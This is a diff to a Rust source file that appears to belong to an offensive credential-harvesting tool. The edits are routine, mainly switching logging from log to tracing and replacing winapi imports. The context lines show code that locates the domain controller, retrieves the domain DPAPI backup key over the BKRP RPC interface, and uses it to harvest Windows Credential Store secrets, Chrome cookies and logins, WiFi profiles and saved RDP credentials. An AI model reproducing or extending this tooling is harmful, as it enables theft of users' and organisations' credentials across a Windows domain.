@@ -34,12 +34,12 @@ use aes::cipher::{BlockCipherDecrypt, KeyInit};
 use aes::Aes256;
 use anyhow::{anyhow, bail, Context, Result};
 use base64::engine::Engine;
-use hmac::{Hmac, Mac};
+use hmac::{Hmac, KeyInit, Mac};
 use serde::{Deserialize, Serialize};
 use sha2::Sha512;
 
-use winapi::shared::guiddef::GUID;
-use winapi::shared::minwindef::{DWORD, LPVOID};
+use crate::win_types::GUID;
+use crate::win_types::{DWORD, LPVOID};
 
 // ── Compile-time hash constants ──────────────────────────────────────────────
 //
@@ -365,7 +365,7 @@ fn discover_dc() -> Result<String> {
         bail!("DsGetDcNameW returned empty DC hostname");
     }
 
-    log::info!("Discovered DC: {} (domain: {})", clean_hostname, domain);
+    tracing::info!("Discovered DC: {} (domain: {})", clean_hostname, domain);
 
     Ok(clean_hostname)
 }
@@ -704,7 +704,7 @@ fn rpc_bkrp_backup_key(dc_hostname: &str) -> Result<(u32, Vec<u8>)> {
     bind_ack_buf.truncate(bytes_read as usize);
     parse_rpc_bind_ack(&bind_ack_buf).context("RPC bind to BKRP interface failed")?;
 
-    log::info!("RPC bind to BKRP interface succeeded on {}", dc_hostname);
+    tracing::info!("RPC bind to BKRP interface succeeded on {}", dc_hostname);
 
     // Send BackuprKey request (opnum 0).
     // The principal name should be the DC's hostname or the domain name.
@@ -842,14 +842,14 @@ fn parse_bkrp_response(stub: &[u8]) -> Result<(u32, Vec<u8>)> {
     ]);
 
     if cb_data != max_count {
-        log::warn!(
+        tracing::warn!(
             "BackuprKey: cbData ({}) != max_count ({})",
             cb_data,
             max_count
         );
     }
 
-    log::info!(
+    tracing::info!(
         "Retrieved backup key: version={}, size={} bytes",
         version,
         key_data.len()
@@ -1106,7 +1106,7 @@ fn parse_pvk_blob(key_data: &[u8]) -> Result<Vec<u8>> {
         // PUBLICKEYSTRUC starts with bType (1 byte) + bVersion (1 byte) + reserved (2) + aiKeyAlg (4)
         // bType = 0x07 (PRIVATEKEYBLOB) for RSA private key.
         if !key_data.is_empty() && key_data[0] == 0x07 {
-            log::info!("Backup key appears to be a raw PRIVATEKEYBLOB (no PVK header)");
+            tracing::info!("Backup key appears to be a raw PRIVATEKEYBLOB (no PVK header)");
             return Ok(key_data.to_vec());
         }
         bail!("Invalid PVK magic: 0x{magic:08X}");
@@ -1246,7 +1246,7 @@ pub fn retrieve_backup_key(dc_hostname: Option<String>) -> Result<BackupKeyInfo>
         bail!("No DC hostname provided and auto-discovery failed");
     }
 
-    log::info!("Retrieving DPAPI backup key from DC: {}", dc);
+    tracing::info!("Retrieving DPAPI backup key from DC: {}", dc);
 
     // Call BKRP BackuprKey via RPC.
     let (version, key_data) =
@@ -1337,28 +1337,28 @@ pub fn harvest_dpapi_secrets(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>>
     // 1. Windows Credential Store.
     match harvest_credential_store(backup_key_data) {
         Ok(mut s) => secrets.append(&mut s),
-        Err(e) => log::warn!("Credential Store harvest failed: {e:#}"),
+        Err(e) => tracing::warn!("Credential Store harvest failed: {e:#}"),
     }
 
     // 2. Chrome cookies/login data.
     match harvest_chrome_data(backup_key_data) {
         Ok(mut s) => secrets.append(&mut s),
-        Err(e) => log::warn!("Chrome data harvest failed: {e:#}"),
+        Err(e) => tracing::warn!("Chrome data harvest failed: {e:#}"),
     }
 
     // 3. WiFi profiles.
     match harvest_wifi_profiles(backup_key_data) {
         Ok(mut s) => secrets.append(&mut s),
-        Err(e) => log::warn!("WiFi profile harvest failed: {e:#}"),
+        Err(e) => tracing::warn!("WiFi profile harvest failed: {e:#}"),
     }
 
     // 4. RDP saved connections.
     match harvest_rdp_credentials(backup_key_data) {
         Ok(mut s) => secrets.append(&mut s),
-        Err(e) => log::warn!("RDP credential harvest failed: {e:#}"),
+        Err(e) => tracing::warn!("RDP credential harvest failed: {e:#}"),
     }
 
-    log::info!("Harvested {} DPAPI secrets total", secrets.len());
+    tracing::info!("Harvested {} DPAPI secrets total", secrets.len());
     Ok(secrets)
 }
 
@@ -1793,7 +1793,7 @@ mod tests {
             for i in 0..16 {
                 block[i] = chunk[i] ^ prev[i];
             }
-            let mut ga: Block<Aes256> = Block::clone_from_slice(&block);
+            let mut ga: Block<Aes256> = Block::<Aes256>::from(block);
             cipher.encrypt_block(&mut ga);
             let enc: [u8; 16] = ga.into();
             ciphertext.extend_from_slice(&enc);
